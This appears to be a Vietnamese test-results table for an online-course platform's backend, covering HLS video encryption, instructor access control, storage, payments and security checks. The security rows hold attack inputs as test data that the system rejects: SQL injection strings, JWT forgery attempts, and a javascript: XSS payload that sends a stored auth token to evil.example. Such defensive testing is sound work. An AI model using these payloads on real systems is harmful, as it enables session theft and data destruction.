| HLS-01 | Video HLS mã hóa AES-128 | Khóa video — bọc bằng master key | seal → open trả lại đúng 16 byte, mỗi lần seal ra chuỗi khác nhau | ✅ Đạt | 1 |
| HLS-02 | Video HLS mã hóa AES-128 | Khóa video — bọc bằng master key | chuỗi bị sửa → không mở được (GCM xác thực) | ✅ Đạt | 7 |
| HLS-03 | Video HLS mã hóa AES-128 | rewritePlaylist | khóa → URI tương đối "key", đoạn → URL do hàm ký sinh ra, giữ nguyên các thẻ khác | ✅ Đạt | 1 |
| HLS-04 | Video HLS mã hóa AES-128 | processLesson — ffmpeg thật | upload playlist + các đoạn .ts vào thư mục hls của bài học | ✅ Đạt | 0 |
| HLS-05 | Video HLS mã hóa AES-128 | processLesson — ffmpeg thật | đoạn .ts đã mã hóa: không đọc được trực tiếp, giải mã bằng khóa + IV thì ra MPEG-TS hợp lệ | ✅ Đạt | 0 |
| HLS-06 | Video HLS mã hóa AES-128 | processLesson — ffmpeg thật | playlist không chứa đường dẫn khóa trên đĩa server | ✅ Đạt | 0 |
| HLS-07 | Video HLS mã hóa AES-128 | processLesson — ffmpeg thật › Phát lại qua API | chi tiết bài học trả hlsUrl khi READY (vẫn kèm MP4 có hạn làm dự phòng) | ✅ Đạt | 12 |
| HLS-08 | Video HLS mã hóa AES-128 | processLesson — ffmpeg thật › Phát lại qua API | học viên đã mua: playlist với đoạn là presigned URL, không cache | ✅ Đạt | 21 |
| HLS-09 | Video HLS mã hóa AES-128 | processLesson — ffmpeg thật › Phát lại qua API | học viên đã mua: khóa đúng 16 byte, không cache | ✅ Đạt | 5 |
| HLS-10 | Video HLS mã hóa AES-128 | processLesson — ffmpeg thật › Phát lại qua API | chưa mua → 403, chưa đăng nhập → 401 (cả playlist lẫn khóa) | ✅ Đạt | 10 |
| HLS-11 | Video HLS mã hóa AES-128 | processLesson — ffmpeg thật › Phát lại qua API | giảng viên sở hữu xem được; giảng viên khác thì không | ✅ Đạt | 6 |
| HLS-12 | Video HLS mã hóa AES-128 | processLesson — ffmpeg thật | video bị thay trong lúc mã hóa → bỏ kết quả, không ghi đè | ✅ Đạt | 96 |
| HLS-13 | Video HLS mã hóa AES-128 | WebM VP9/Opus | được chuyển mã sang H.264 (không chép thẳng VP9 vào .ts — trình duyệt không phát được) | ✅ Đạt | 503 |
| HLS-14 | Video HLS mã hóa AES-128 | Lỗi mã hóa & mã hóa lại | file trên storage không phải video → FAILED kèm lý do, không để lại file rác | ✅ Đạt | 31 |
| HLS-15 | Video HLS mã hóa AES-128 | Lỗi mã hóa & mã hóa lại | POST /lessons/:id/hls: chủ khóa học → 202 PROCESSING; giảng viên khác → 404; chưa có video → 400 | ✅ Đạt | 16 |
| HLS-16 | Video HLS mã hóa AES-128 | Lỗi mã hóa & mã hóa lại | đang PROCESSING → chi tiết bài học không trả hlsUrl (FE phát MP4), playlist 404 | ✅ Đạt | 10 |
| HLS-17 | Video HLS mã hóa AES-128 | Lỗi mã hóa & mã hóa lại | gỡ video → xóa thư mục HLS và reset trạng thái | ✅ Đạt | 6 |
| INS-01 | Giảng viên & duyệt khóa học | Phân quyền khu vực /api/instructor | khách → 401 | ✅ Đạt | 3 |
| INS-02 | Giảng viên & duyệt khóa học | Phân quyền khu vực /api/instructor | USER → 403 | ✅ Đạt | 4 |
| INS-03 | Giảng viên & duyệt khóa học | Phân quyền khu vực /api/instructor | ADMIN → 403 | ✅ Đạt | 4 |
| INS-04 | Giảng viên & duyệt khóa học | Phân quyền khu vực /api/instructor | USER không upload ảnh được qua /api/instructor/upload | ✅ Đạt | 4 |
| INS-05 | Giảng viên & duyệt khóa học | Giảng viên tạo & quản lý khóa học của mình | tạo khóa học: luôn là DRAFT, gán đúng chủ — bỏ qua status/instructorId/tag gửi lên | ✅ Đạt | 13 |
| INS-06 | Giảng viên & duyệt khóa học | Giảng viên tạo & quản lý khóa học của mình | dashboard trả số liệu dạng number | ✅ Đạt | 25 |
| INS-07 | Giảng viên & duyệt khóa học | Giảng viên tạo & quản lý khóa học của mình | danh sách chỉ gồm khóa học của chính mình | ✅ Đạt | 10 |
| INS-08 | Giảng viên & duyệt khóa học | Chống IDOR — giảng viên B không đụng được dữ liệu của A | chủ khóa học thao tác được bình thường | ✅ Đạt | 5 |
| INS-09 | Giảng viên & duyệt khóa học | Chống IDOR — giảng viên B không đụng được dữ liệu của A | get () => `/api/instructor/courses/${course.id}` → 404 | ✅ Đạt | 3 |
| INS-10 | Giảng viên & duyệt khóa học | Chống IDOR — giảng viên B không đụng được dữ liệu của A | put () => `/api/instructor/courses/${course.id}` → 404 | ✅ Đạt | 3 |
| INS-11 | Giảng viên & duyệt khóa học | Chống IDOR — giảng viên B không đụng được dữ liệu của A | delete () => `/api/instructor/courses/${course.id}` → 404 | ✅ Đạt | 4 |
| INS-12 | Giảng viên & duyệt khóa học | Chống IDOR — giảng viên B không đụng được dữ liệu của A | post () => `/api/instructor/courses/${course.id}/submit` → 404 | ✅ Đạt | 3 |
| INS-13 | Giảng viên & duyệt khóa học | Chống IDOR — giảng viên B không đụng được dữ liệu của A | get () => `/api/instructor/courses/${course.id}/lessons` → 404 | ✅ Đạt | 3 |
| INS-14 | Giảng viên & duyệt khóa học | Chống IDOR — giảng viên B không đụng được dữ liệu của A | post () => `/api/instructor/courses/${course.id}/lessons` → 404 | ✅ Đạt | 5 |
| INS-15 | Giảng viên & duyệt khóa học | Chống IDOR — giảng viên B không đụng được dữ liệu của A | put () => `/api/instructor/lessons/${lesson.id}` → 404 | ✅ Đạt | 4 |
| INS-16 | Giảng viên & duyệt khóa học | Chống IDOR — giảng viên B không đụng được dữ liệu của A | delete () => `/api/instructor/lessons/${lesson.id}` → 404 | ✅ Đạt | 3 |
| INS-17 | Giảng viên & duyệt khóa học | Chống IDOR — giảng viên B không đụng được dữ liệu của A | get () => `/api/instructor/lessons/${lesson.id}/quiz` → 404 | ✅ Đạt | 3 |
| INS-18 | Giảng viên & duyệt khóa học | Chống IDOR — giảng viên B không đụng được dữ liệu của A | put () => `/api/instructor/quizzes/${quizId}` → 404 | ✅ Đạt | 5 |
| INS-19 | Giảng viên & duyệt khóa học | Chống IDOR — giảng viên B không đụng được dữ liệu của A | delete () => `/api/instructor/quizzes/${quizId}` → 404 | ✅ Đạt | 6 |
| INS-20 | Giảng viên & duyệt khóa học | Chống IDOR — giảng viên B không đụng được dữ liệu của A | post () => `/api/instructor/quizzes/${quizId}/questions` → 404 | ✅ Đạt | 4 |
| INS-21 | Giảng viên & duyệt khóa học | Chống IDOR — giảng viên B không đụng được dữ liệu của A | put () => `/api/instructor/quiz-questions/${questionId}` → 404 | ✅ Đạt | 4 |
| INS-22 | Giảng viên & duyệt khóa học | Chống IDOR — giảng viên B không đụng được dữ liệu của A | delete () => `/api/instructor/quiz-questions/${questionId}` → 404 | ✅ Đạt | 4 |
| INS-23 | Giảng viên & duyệt khóa học | Chống IDOR — giảng viên B không đụng được dữ liệu của A | dữ liệu của A không bị thay đổi sau các request trên | ✅ Đạt | 2 |
| INS-24 | Giảng viên & duyệt khóa học | Chống IDOR — giảng viên B không đụng được dữ liệu của A | sắp xếp bài học có lẫn bài của người khác → 404 | ✅ Đạt | 8 |
| INS-25 | Giảng viên & duyệt khóa học | Chống IDOR — giảng viên B không đụng được dữ liệu của A | gán bài học vào section của khóa học khác → 400 | ✅ Đạt | 14 |
| INS-26 | Giảng viên & duyệt khóa học | Quy trình gửi duyệt → duyệt / từ chối | khóa học chưa có bài học → không gửi duyệt được | ✅ Đạt | 6 |
| INS-27 | Giảng viên & duyệt khóa học | Quy trình gửi duyệt → duyệt / từ chối | gửi duyệt → PENDING_REVIEW, admin nhận thông báo, khóa chỉnh sửa, chưa hiện công khai | ✅ Đạt | 19 |
| INS-28 | Giảng viên & duyệt khóa học | Quy trình gửi duyệt → duyệt / từ chối | admin duyệt → PUBLISHED, hiện công khai kèm thông tin giảng viên, giảng viên được báo | ✅ Đạt | 11 |
| INS-29 | Giảng viên & duyệt khóa học | Quy trình gửi duyệt → duyệt / từ chối | từ chối bắt buộc có lý do; giảng viên thấy lý do; gửi lại thì lý do được xóa | ✅ Đạt | 22 |
| INS-30 | Giảng viên & duyệt khóa học | Quy trình gửi duyệt → duyệt / từ chối | duyệt khóa học không ở trạng thái chờ duyệt → 409 | ✅ Đạt | 4 |
| INS-31 | Giảng viên & duyệt khóa học | Quy trình gửi duyệt → duyệt / từ chối | chỉ ADMIN được duyệt | ✅ Đạt | 4 |
| INS-32 | Giảng viên & duyệt khóa học | Khóa học đã xuất bản | không đổi được giá / tên | ✅ Đạt | 4 |
| INS-33 | Giảng viên & duyệt khóa học | Khóa học đã xuất bản | gửi lại nguyên giá cũ + đổi mô tả ngắn → được | ✅ Đạt | 6 |
| INS-34 | Giảng viên & duyệt khóa học | Khóa học đã xuất bản | không xóa được | ✅ Đạt | 4 |
| INS-35 | Giảng viên & duyệt khóa học | Admin quản lý giảng viên | đổi role USER → INSTRUCTOR | ✅ Đạt | 6 |
| INS-36 | Giảng viên & duyệt khóa học | Admin quản lý giảng viên | role không hợp lệ → 400 | ✅ Đạt | 5 |
| INS-37 | Giảng viên & duyệt khóa học | Admin quản lý giảng viên | gán khóa học cho giảng viên → đồng bộ instructor_name; gán cho USER → 400 | ✅ Đạt | 9 |
| INS-38 | Giảng viên & duyệt khóa học | Admin quản lý giảng viên | lọc khóa học chờ duyệt + đếm pendingReview | ✅ Đạt | 9 |
| INS-39 | Giảng viên & duyệt khóa học | Admin quản lý giảng viên | kéo-thả sắp xếp khóa học hoạt động (trước đây route bị /:id chặn) | ✅ Đạt | 10 |
| MED-01 | Video & tài liệu (object storage) | Trang khóa học công khai không lộ link video | GET /api/courses/:slug không trả video_url của bất kỳ bài nào | ✅ Đạt | 26 |
| MED-02 | Video & tài liệu (object storage) | Trang khóa học công khai không lộ link video | bài xem thử lấy link qua /preview; bài trả phí bị chặn | ✅ Đạt | 37 |
| MED-03 | Video & tài liệu (object storage) | Bước 1 — xin presigned URL để upload | chủ khóa học nhận URL có chữ ký, key nằm trong thư mục bài học, hết hạn 15 phút | ✅ Đạt | 42 |
| MED-04 | Video & tài liệu (object storage) | Bước 1 — xin presigned URL để upload | sai định dạng video → 400 | ✅ Đạt | 6 |
| MED-05 | Video & tài liệu (object storage) | Bước 1 — xin presigned URL để upload | PDF giả làm video → 400 | ✅ Đạt | 5 |
| MED-06 | Video & tài liệu (object storage) | Bước 1 — xin presigned URL để upload | file .exe làm tài liệu → 400 | ✅ Đạt | 5 |
| MED-07 | Video & tài liệu (object storage) | Bước 1 — xin presigned URL để upload | quá dung lượng → 400 | ✅ Đạt | 5 |
| MED-08 | Video & tài liệu (object storage) | Bước 1 — xin presigned URL để upload | size không hợp lệ → 400 | ✅ Đạt | 60 |
| MED-09 | Video & tài liệu (object storage) | Bước 1 — xin presigned URL để upload | kind lạ → 400 | ✅ Đạt | 24 |
| MED-10 | Video & tài liệu (object storage) | Bước 1 — xin presigned URL để upload | giảng viên khác → 404; học viên → 403 | ✅ Đạt | 194 |
| MED-11 | Video & tài liệu (object storage) | Bước 1 — xin presigned URL để upload | admin dùng được qua /api/admin | ✅ Đạt | 50 |
| MED-12 | Video & tài liệu (object storage) | Bước 3 — gắn file đã upload vào bài học | key của bài học khác → 400 (không trỏ được sang file người khác) | ✅ Đạt | 12 |
| MED-13 | Video & tài liệu (object storage) | Bước 3 — gắn file đã upload vào bài học | key có ".." → 400 | ✅ Đạt | 7 |
| MED-14 | Video & tài liệu (object storage) | Bước 3 — gắn file đã upload vào bài học | file chưa có trên storage → 400 | ✅ Đạt | 11 |
| MED-15 | Video & tài liệu (object storage) | Bước 3 — gắn file đã upload vào bài học | file thật sai định dạng (đổi Content-Type khi upload) → 400 và bị xóa | ✅ Đạt | 12 |
| MED-16 | Video & tài liệu (object storage) | Bước 3 — gắn file đã upload vào bài học | hợp lệ → lưu video_key; thay video mới thì xóa file cũ | ✅ Đạt | 28 |
| MED-17 | Video & tài liệu (object storage) | Bước 3 — gắn file đã upload vào bài học | gắn PDF kèm tên file gốc | ✅ Đạt | 14 |
| MED-18 | Video & tài liệu (object storage) | Xem video / tài liệu — chỉ người có quyền nhận link ngắn hạn | học viên đã mua: link presigned trỏ tới file trên storage, kèm thời điểm hết hạn | ✅ Đạt | 13 |
| MED-19 | Video & tài liệu (object storage) | Xem video / tài liệu — chỉ người có quyền nhận link ngắn hạn | video đã mã hóa HLS xong → chỉ có playlist HLS, không cấp link MP4 tải được nguyên file | ✅ Đạt | 8 |
| MED-20 | Video & tài liệu (object storage) | Xem video / tài liệu — chỉ người có quyền nhận link ngắn hạn | link video ngoài (YouTube) không còn được phát, cũng không lưu được qua API | ✅ Đạt | 19 |
| MED-21 | Video & tài liệu (object storage) | Xem video / tài liệu — chỉ người có quyền nhận link ngắn hạn | storage không kết nối được → playlist HLS trả 503 có thông báo, không phải 500 | ✅ Đạt | 7 |
| MED-22 | Video & tài liệu (object storage) | Xem video / tài liệu — chỉ người có quyền nhận link ngắn hạn | chưa mua → 403, không nhận được link | ✅ Đạt | 50 |
| MED-23 | Video & tài liệu (object storage) | Xem video / tài liệu — chỉ người có quyền nhận link ngắn hạn | staffView chỉ bật cho admin / giảng viên sở hữu | ✅ Đạt | 52 |
| MED-24 | Video & tài liệu (object storage) | Xem video / tài liệu — chỉ người có quyền nhận link ngắn hạn | giảng viên sở hữu và admin xem được dù không mua; giảng viên khác thì không | ✅ Đạt | 22 |
| MED-25 | Video & tài liệu (object storage) | Xem video / tài liệu — chỉ người có quyền nhận link ngắn hạn | tài liệu PDF: link 5 phút, mở inline với tên file gốc | ✅ Đạt | 14 |
| MED-26 | Video & tài liệu (object storage) | Dọn file trên storage | gỡ video khỏi bài học → xóa object | ✅ Đạt | 18 |
| MED-27 | Video & tài liệu (object storage) | Dọn file trên storage | xóa bài học → xóa luôn file đính kèm | ✅ Đạt | 21 |
| MED-28 | Video & tài liệu (object storage) | Mục lục trong trình phát | bài học chưa gán section vẫn hiện (nhóm "Bài học khác" ở cuối), không mất khỏi điều hướng | ✅ Đạt | 7 |
| QUIZ-DELETE-01 | quiz-delete.test.js | Xóa quiz | quiz chưa ai làm → xóa được | ✅ Đạt | 16 |
| QUIZ-DELETE-02 | quiz-delete.test.js | Xóa quiz | quiz đã có học viên làm → 409 kèm lý do, lịch sử làm bài còn nguyên | ✅ Đạt | 11 |
| QUIZ-DELETE-03 | quiz-delete.test.js | Xóa bài học có quiz | quiz chưa ai làm → xóa bài học được (quiz bị xóa theo) | ✅ Đạt | 15 |
| QUIZ-DELETE-04 | quiz-delete.test.js | Xóa bài học có quiz | quiz đã có học viên làm → 409, bài học không bị xóa | ✅ Đạt | 10 |
| PAY-01 | Thanh toán & doanh thu giảng viên | Chia doanh thu | giảng viên nhận (100 − hoa hồng)%, làm tròn đồng; khóa không có giảng viên → nền tảng giữ 100% | ✅ Đạt | 1 |
| PAY-02 | Thanh toán & doanh thu giảng viên | markOrderPaid — một chỗ duy nhất chuyển đơn sang PAID | chụp số liệu doanh thu, tạo enrollment, tăng số học viên | ✅ Đạt | 8 |
| PAY-03 | Thanh toán & doanh thu giảng viên | markOrderPaid — một chỗ duy nhất chuyển đơn sang PAID | đổi tỷ lệ hoa hồng SAU khi bán không làm thay đổi doanh thu cũ | ✅ Đạt | 9 |
| PAY-04 | Thanh toán & doanh thu giảng viên | markOrderPaid — một chỗ duy nhất chuyển đơn sang PAID | gọi 2 lần đồng thời → chỉ 1 lần xử lý (không trùng enrollment / số học viên) | ✅ Đạt | 8 |
| PAY-05 | Thanh toán & doanh thu giảng viên | POST /api/orders/verify — bảo mật callback thanh toán | dev mock (VNPay chưa cấu hình) → PAID; gọi lại lần 2 không xử lý lại | ✅ Đạt | 15 |
| PAY-06 | Thanh toán & doanh thu giảng viên | POST /api/orders/verify — bảo mật callback thanh toán | thông báo thanh toán có đúng mã đơn (trước đây hiển thị "#undefined") | ✅ Đạt | 60 |
| PAY-07 | Thanh toán & doanh thu giảng viên | POST /api/orders/verify — bảo mật callback thanh toán | không có dev_mock khi VNPay chưa cấu hình → 400, đơn vẫn PENDING | ✅ Đạt | 6 |
| PAY-08 | Thanh toán & doanh thu giảng viên | POST /api/orders/verify — bảo mật callback thanh toán | đơn của người khác → 403 | ✅ Đạt | 6 |
| PAY-09 | Thanh toán & doanh thu giảng viên | POST /api/orders/verify — bảo mật callback thanh toán | VNPay ĐÃ cấu hình: gửi dev_mock=1 không còn bỏ qua được kiểm tra chữ ký | ✅ Đạt | 99 |
| PAY-10 | Thanh toán & doanh thu giảng viên | POST /api/orders/verify — bảo mật callback thanh toán | thanh toán thất bại → FAILED; không ghi đè đơn đã PAID | ✅ Đạt | 7 |
| PAY-11 | Thanh toán & doanh thu giảng viên | Doanh thu & chi trả giảng viên | giảng viên thấy đúng doanh thu (bỏ đơn đã hủy), theo ngày và theo khóa | ✅ Đạt | 7 |
| PAY-12 | Thanh toán & doanh thu giảng viên | Doanh thu & chi trả giảng viên | giảng viên khác không thấy doanh thu của người này | ✅ Đạt | 5 |
| PAY-13 | Thanh toán & doanh thu giảng viên | Doanh thu & chi trả giảng viên | chưa có tài khoản ngân hàng → admin không tạo được khoản chi trả | ✅ Đạt | 3 |
| PAY-14 | Thanh toán & doanh thu giảng viên | Doanh thu & chi trả giảng viên | cập nhật tài khoản ngân hàng (kiểm tra số tài khoản) | ✅ Đạt | 11 |
| PAY-15 | Thanh toán & doanh thu giảng viên | Doanh thu & chi trả giảng viên | không chi trả vượt số dư; tạo → chờ → đã trả; số liệu 2 phía khớp nhau | ✅ Đạt | 39 |
| PAY-16 | Thanh toán & doanh thu giảng viên | Doanh thu & chi trả giảng viên | 2 admin tạo chi trả cùng lúc không vượt được số dư | ✅ Đạt | 11 |
| PAY-17 | Thanh toán & doanh thu giảng viên | Doanh thu & chi trả giảng viên | hủy khoản đang chờ; không hủy được khoản đã trả | ✅ Đạt | 8 |
| PAY-18 | Thanh toán & doanh thu giảng viên | Doanh thu & chi trả giảng viên | tỷ lệ hoa hồng riêng: 0–100 hoặc null; chỉ áp cho giảng viên | ✅ Đạt | 9 |
| PAY-19 | Thanh toán & doanh thu giảng viên | Doanh thu & chi trả giảng viên | chỉ admin xem đối soát; học viên / giảng viên → 403 | ✅ Đạt | 3 |
| SEC-01 | Bảo mật | Header bảo mật & CORS | helmet: nosniff, chống clickjacking, ẩn X-Powered-By; ảnh /uploads vẫn dùng được từ FE khác cổng | ✅ Đạt | 3 |
| SEC-02 | Bảo mật | Header bảo mật & CORS | CORS chỉ cho phép đúng origin của FE | ✅ Đạt | 4 |
| SEC-03 | Bảo mật | JWT — không giả mạo được | alg "none" (không chữ ký) → 401 | ✅ Đạt | 2 |
| SEC-04 | Bảo mật | JWT — không giả mạo được | ký bằng secret khác để tự nâng quyền ADMIN → 401 | ✅ Đạt | 5 |
| SEC-05 | Bảo mật | JWT — không giả mạo được | token hết hạn → 401 | ✅ Đạt | 3 |
| SEC-06 | Bảo mật | Đăng ký / mật khẩu | không tự gán role ADMIN khi đăng ký (mass assignment) | ✅ Đạt | 205 |
| SEC-07 | Bảo mật | Đăng ký / mật khẩu | mật khẩu quá ngắn → 400 | ✅ Đạt | 2 |
| SEC-08 | Bảo mật | Đăng ký / mật khẩu | mật khẩu quá 72 byte → 400 | ✅ Đạt | 2 |
| SEC-09 | Bảo mật | Đăng ký / mật khẩu | đổi mật khẩu yếu → 400 | ✅ Đạt | 5 |
| SEC-10 | Bảo mật | Đăng ký / mật khẩu | quên mật khẩu: email có hay không có tài khoản đều trả cùng thông báo (không dò được email) | ✅ Đạt | 10 |
| SEC-11 | Bảo mật | Đăng ký / mật khẩu | token đặt lại mật khẩu chỉ dùng 1 lần, và thu hồi mọi phiên đăng nhập cũ | ✅ Đạt | 414 |
| SEC-12 | Bảo mật | SQL injection | đăng nhập với email ' OR '1'='1 → 401, bảng users còn nguyên | ✅ Đạt | 4 |
| SEC-13 | Bảo mật | SQL injection | đăng nhập với email admin@test.local' --  → 401, bảng users còn nguyên | ✅ Đạt | 4 |
| SEC-14 | Bảo mật | SQL injection | đăng nhập với email "; DROP TABLE users; -- → 401, bảng users còn nguyên | ✅ Đạt | 2 |
| SEC-15 | Bảo mật | SQL injection | tìm kiếm khóa học với chuỗi injection → 200, không lỗi máy chủ | ✅ Đạt | 7 |
| SEC-16 | Bảo mật | Link tài liệu bài học — chỉ http(s) (chống stored XSS qua javascript:) | giảng viên sửa bài học với "javascript:fetch('https://evil.example/?t='+localStorage.getItem('hoisted.auth'))" → 400, không lưu | ✅ Đạt | 4 |
| SEC-17 | Bảo mật | Link tài liệu bài học — chỉ http(s) (chống stored XSS qua javascript:) | giảng viên sửa bài học với "JaVaScRiPt:alert(1)" → 400, không lưu | ✅ Đạt | 4 |
| SEC-18 | Bảo mật | Link tài liệu bài học — chỉ http(s) (chống stored XSS qua javascript:) | giảng viên sửa bài học với "data:text/html,<script>alert(1)</script>" → 400, không lưu | ✅ Đạt | 3 |
| SEC-19 | Bảo mật | Link tài liệu bài học — chỉ http(s) (chống stored XSS qua javascript:) | giảng viên sửa bài học với "không-phải-url" → 400, không lưu | ✅ Đạt | 4 |
| SEC-20 | Bảo mật | Link tài liệu bài học — chỉ http(s) (chống stored XSS qua javascript:) | giảng viên sửa bài học với 42 → 400, không lưu | ✅ Đạt | 4 |
| SEC-21 | Bảo mật | Link tài liệu bài học — chỉ http(s) (chống stored XSS qua javascript:) | giảng viên tạo bài học với link javascript: → 400 | ✅ Đạt | 3 |
| SEC-22 | Bảo mật | Link tài liệu bài học — chỉ http(s) (chống stored XSS qua javascript:) | link https hợp lệ được lưu; chuỗi rỗng gỡ link | ✅ Đạt | 11 |
| SEC-23 | Bảo mật | Link tài liệu bài học — chỉ http(s) (chống stored XSS qua javascript:) | dòng cũ đã lưu link javascript: không bao giờ được trả cho học viên | ✅ Đạt | 8 |
| SEC-24 | Bảo mật | Xuất CSV — chống CSV/formula injection | họ tên bắt đầu bằng = + - @ được thêm dấu ' và nháy kép được nhân đôi | ✅ Đạt | 11 |
| SEC-25 | Bảo mật | Admin tạo khóa học | không tạo thẳng ở trạng thái Đã xuất bản / Chờ duyệt (khóa mới chưa có bài) hay trạng thái lạ | ✅ Đạt | 15 |
| SEC-26 | Bảo mật | Dữ liệu sai kiểu / quá dài → 400 có lời giải thích, không phải 500 | khóa học: tên quá dài, slug có dấu, cấp độ lạ, ảnh bìa javascript:, tên là object | ✅ Đạt | 34 |
| SEC-27 | Bảo mật | Dữ liệu sai kiểu / quá dài → 400 có lời giải thích, không phải 500 | hồ sơ: họ tên là object / quá dài, tên đăng nhập sai mẫu → 400 | ✅ Đạt | 22 |
| SEC-28 | Bảo mật | JWT secret khi chạy production | thiếu, quá ngắn hoặc còn giá trị mẫu "change-me" → dừng khởi động; secret đủ dài → chạy | ✅ Đạt | 43 |
| SEC-29 | Bảo mật | Chống brute-force đăng nhập | sai mật khẩu quá 3 lần → 429, kể cả khi sau đó nhập đúng | ✅ Đạt | 22 |
| SEC-30 | Bảo mật | Chống brute-force đăng nhập | đăng nhập đúng (nhiều lần liên tiếp, cùng giây) không bị tính và không lỗi | ✅ Đạt | 25 |
